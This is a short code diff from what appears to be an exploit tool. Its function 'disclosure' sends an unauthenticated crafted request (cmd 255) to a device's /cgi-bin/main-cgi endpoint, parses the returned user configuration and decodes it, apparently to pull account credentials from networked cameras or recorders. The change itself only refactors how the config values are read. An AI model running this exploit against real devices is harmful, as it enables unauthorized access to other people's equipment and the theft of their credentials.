@@ -26,11 +26,10 @@ def disclosure(ip: str) -> list:
             if char != "124" and char != "0": decoded.append(code_table[char])
         return ''.join(decoded)
 
-    headers = {'User-Agent': config['USERAGENT']}
+    headers = {'User-Agent': config.USERAGENT}
     url = f"http://{ip}" + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
-    timeout = config['TIMEOUT']
     try:
-        r = requests.get(url, headers=headers, verify=False, timeout=timeout)
+        r = requests.get(url, headers=headers, verify=False, timeout=config.TIMEOUT)
         if r.status_code == 200 and r.text:
             tree = ElementTree.fromstring(r.text)
             items = tree.find('UserCfg')
